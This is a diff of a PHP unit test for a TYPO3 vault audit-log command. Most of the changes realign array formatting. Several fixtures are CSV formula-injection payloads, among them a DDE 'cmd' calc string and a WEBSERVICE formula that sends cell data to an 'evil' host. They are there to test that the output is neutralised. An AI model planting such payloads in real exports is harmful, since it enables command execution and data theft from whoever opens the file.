@@ -29,6 +29,9 @@ use Symfony\Component\Console\Tester\CommandTester;
 use TYPO3\CMS\Core\Database\Connection;
 use TYPO3\CMS\Core\Database\ConnectionPool;
 
+use function in_array;
+use function sprintf;
+
 #[CoversClass(VaultAuditCommand::class)]
 #[AllowMockObjectsWithoutExpectations]
 final class VaultAuditCommandTest extends TestCase
@@ -60,15 +63,15 @@ final class VaultAuditCommandTest extends TestCase
     {
         parent::setUp();
 
-        $this->auditLogService = $this->createMock(AuditLogServiceInterface::class);
-        $this->anchorStore = $this->createMock(AuditChainAnchorStoreInterface::class);
-        $this->connectionPool = $this->createMock(ConnectionPool::class);
+        $this->auditLogService      = $this->createMock(AuditLogServiceInterface::class);
+        $this->anchorStore          = $this->createMock(AuditChainAnchorStoreInterface::class);
+        $this->connectionPool       = $this->createMock(ConnectionPool::class);
         $this->accessControlService = $this->createMock(AccessControlServiceInterface::class);
-        $this->grantedPermissions = VaultPermission::cases();
+        $this->grantedPermissions   = VaultPermission::cases();
         $this->accessControlService
             ->method('isGranted')
             ->willReturnCallback(
-                fn (VaultPermission $permission): bool => \in_array($permission, $this->grantedPermissions, true),
+                fn (VaultPermission $permission): bool => in_array($permission, $this->grantedPermissions, true),
             );
 
         $command = $this->createCommand();
@@ -229,7 +232,7 @@ final class VaultAuditCommandTest extends TestCase
         self::assertStringNotContainsString(
             'Access denied',
             $this->normalizedDisplay(),
-            \sprintf('Holding %s alone must satisfy this mode, but got: %s', $required->value, $refusalMessage),
+            sprintf('Holding %s alone must satisfy this mode, but got: %s', $required->value, $refusalMessage),
         );
     }
 
@@ -295,18 +298,18 @@ final class VaultAuditCommandTest extends TestCase
     public function outputsTableFormat(): void
     {
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'test-secret',
-            'action' => 'read',
-            'success' => 1,
-            'actor_uid' => 1,
-            'actor_username' => 'admin',
-            'actor_type' => 'be_user',
-            'ip_address' => self::IP_ADDRESS,
-            'entry_hash' => 'abc123def456',
-            'previous_hash' => 'prev123',
-            'context' => '{}',
+            'action'            => 'read',
+            'success'           => 1,
+            'actor_uid'         => 1,
+            'actor_username'    => 'admin',
+            'actor_type'        => 'be_user',
+            'ip_address'        => self::IP_ADDRESS,
+            'entry_hash'        => 'abc123def456',
+            'previous_hash'     => 'prev123',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -327,18 +330,18 @@ final class VaultAuditCommandTest extends TestCase
     public function outputsJsonFormat(): void
     {
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'json-test',
-            'action' => 'create',
-            'success' => 1,
-            'actor_uid' => 2,
-            'actor_username' => 'editor',
-            'actor_type' => 'be_user',
-            'ip_address' => '192.168.1.1',
-            'entry_hash' => 'hash123',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'create',
+            'success'           => 1,
+            'actor_uid'         => 2,
+            'actor_username'    => 'editor',
+            'actor_type'        => 'be_user',
+            'ip_address'        => '192.168.1.1',
+            'entry_hash'        => 'hash123',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -359,18 +362,18 @@ final class VaultAuditCommandTest extends TestCase
     public function outputsCsvFormat(): void
     {
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'csv-test',
-            'action' => 'delete',
-            'success' => 0,
-            'actor_uid' => 1,
-            'actor_username' => 'admin',
-            'actor_type' => 'be_user',
-            'ip_address' => '10.0.0.1',
-            'entry_hash' => 'csvhash',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'delete',
+            'success'           => 0,
+            'actor_uid'         => 1,
+            'actor_username'    => 'admin',
+            'actor_type'        => 'be_user',
+            'ip_address'        => '10.0.0.1',
+            'entry_hash'        => 'csvhash',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -498,18 +501,18 @@ final class VaultAuditCommandTest extends TestCase
         vfsStream::setup('exports');
 
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'exported',
-            'action' => 'read',
-            'success' => 1,
-            'actor_uid' => 1,
-            'actor_username' => 'admin',
-            'actor_type' => 'be_user',
-            'ip_address' => self::IP_ADDRESS,
-            'entry_hash' => 'exporthash',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'read',
+            'success'           => 1,
+            'actor_uid'         => 1,
+            'actor_username'    => 'admin',
+            'actor_type'        => 'be_user',
+            'ip_address'        => self::IP_ADDRESS,
+            'entry_hash'        => 'exporthash',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -614,18 +617,18 @@ final class VaultAuditCommandTest extends TestCase
     public function showsFailedEntriesInTable(): void
     {
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'failed-secret',
-            'action' => 'read',
-            'success' => 0,
-            'actor_uid' => 1,
-            'actor_username' => 'hacker',
-            'actor_type' => 'be_user',
-            'ip_address' => '192.168.1.100',
-            'entry_hash' => 'failhash',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'read',
+            'success'           => 0,
+            'actor_uid'         => 1,
+            'actor_username'    => 'hacker',
+            'actor_type'        => 'be_user',
+            'ip_address'        => '192.168.1.100',
+            'entry_hash'        => 'failhash',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -645,32 +648,32 @@ final class VaultAuditCommandTest extends TestCase
     {
         $entries = [
             AuditLogEntry::fromDatabaseRow([
-                'uid' => 1,
-                'crdate' => 1704067200,
+                'uid'               => 1,
+                'crdate'            => 1704067200,
                 'secret_identifier' => 'secret-1',
-                'action' => 'create',
-                'success' => 1,
-                'actor_uid' => 1,
-                'actor_username' => 'admin',
-                'actor_type' => 'be_user',
-                'ip_address' => self::IP_ADDRESS,
-                'entry_hash' => 'hash1',
-                'previous_hash' => '',
-                'context' => '{}',
+                'action'            => 'create',
+                'success'           => 1,
+                'actor_uid'         => 1,
+                'actor_username'    => 'admin',
+                'actor_type'        => 'be_user',
+                'ip_address'        => self::IP_ADDRESS,
+                'entry_hash'        => 'hash1',
+                'previous_hash'     => '',
+                'context'           => '{}',
             ]),
             AuditLogEntry::fromDatabaseRow([
-                'uid' => 2,
-                'crdate' => 1704153600,
+                'uid'               => 2,
+                'crdate'            => 1704153600,
                 'secret_identifier' => 'secret-2',
-                'action' => 'read',
-                'success' => 1,
-                'actor_uid' => 2,
-                'actor_username' => 'editor',
-                'actor_type' => 'be_user',
-                'ip_address' => '10.0.0.1',
-                'entry_hash' => 'hash2',
-                'previous_hash' => 'hash1',
-                'context' => '{}',
+                'action'            => 'read',
+                'success'           => 1,
+                'actor_uid'         => 2,
+                'actor_username'    => 'editor',
+                'actor_type'        => 'be_user',
+                'ip_address'        => '10.0.0.1',
+                'entry_hash'        => 'hash2',
+                'previous_hash'     => 'hash1',
+                'context'           => '{}',
             ]),
         ];
 
@@ -721,9 +724,9 @@ final class VaultAuditCommandTest extends TestCase
 
         $this->commandTester->execute([
             '--identifier' => 'multi-filter',
-            '--action' => 'read',
-            '--actor' => '5',
-            '--limit' => '100',
+            '--action'     => 'read',
+            '--actor'      => '5',
+            '--limit'      => '100',
         ]);
     }
 
@@ -733,18 +736,18 @@ final class VaultAuditCommandTest extends TestCase
         vfsStream::setup('exports');
 
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'csv-export',
-            'action' => 'read',
-            'success' => 1,
-            'actor_uid' => 1,
-            'actor_username' => 'admin',
-            'actor_type' => 'be_user',
-            'ip_address' => self::IP_ADDRESS,
-            'entry_hash' => 'csvhash',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'read',
+            'success'           => 1,
+            'actor_uid'         => 1,
+            'actor_username'    => 'admin',
+            'actor_type'        => 'be_user',
+            'ip_address'        => self::IP_ADDRESS,
+            'entry_hash'        => 'csvhash',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -768,18 +771,18 @@ final class VaultAuditCommandTest extends TestCase
     public function csvConsoleOutputNeutralizesFormulaInjection(): void
     {
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => '=1+1',
-            'action' => 'read',
-            'success' => 1,
-            'actor_uid' => 1,
-            'actor_username' => '@SUM(A1)',
-            'actor_type' => 'be_user',
-            'ip_address' => '10.0.0.1',
-            'entry_hash' => 'csvhash',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'read',
+            'success'           => 1,
+            'actor_uid'         => 1,
+            'actor_username'    => '@SUM(A1)',
+            'actor_type'        => 'be_user',
+            'ip_address'        => '10.0.0.1',
+            'entry_hash'        => 'csvhash',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -804,20 +807,20 @@ final class VaultAuditCommandTest extends TestCase
         vfsStream::setup('exports');
 
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'benign_id',
-            'action' => 'read',
-            'success' => 1,
-            'actor_uid' => 1,
-            'actor_username' => 'admin',
-            'actor_type' => 'be_user',
-            'ip_address' => '10.0.0.1',
-            'user_agent' => "=cmd|'/c calc'!A1",
-            'request_id' => '@SUM(1+1)',
-            'entry_hash' => 'hash',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'read',
+            'success'           => 1,
+            'actor_uid'         => 1,
+            'actor_username'    => 'admin',
+            'actor_type'        => 'be_user',
+            'ip_address'        => '10.0.0.1',
+            'user_agent'        => "=cmd|'/c calc'!A1",
+            'request_id'        => '@SUM(1+1)',
+            'entry_hash'        => 'hash',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
@@ -851,20 +854,20 @@ final class VaultAuditCommandTest extends TestCase
         $payload = 'x\\",=WEBSERVICE("http://evil/"&A1),y';
 
         $entry = AuditLogEntry::fromDatabaseRow([
-            'uid' => 1,
-            'crdate' => 1704067200,
+            'uid'               => 1,
+            'crdate'            => 1704067200,
             'secret_identifier' => 'benign_id',
-            'action' => 'read',
-            'success' => 1,
-            'actor_uid' => 1,
-            'actor_username' => 'admin',
-            'actor_type' => 'be_user',
-            'ip_address' => '10.0.0.1',
-            'user_agent' => $payload,
-            'request_id' => '',
-            'entry_hash' => 'hash',
-            'previous_hash' => '',
-            'context' => '{}',
+            'action'            => 'read',
+            'success'           => 1,
+            'actor_uid'         => 1,
+            'actor_username'    => 'admin',
+            'actor_type'        => 'be_user',
+            'ip_address'        => '10.0.0.1',
+            'user_agent'        => $payload,
+            'request_id'        => '',
+            'entry_hash'        => 'hash',
+            'previous_hash'     => '',
+            'context'           => '{}',
         ]);
 
         $this->auditLogService
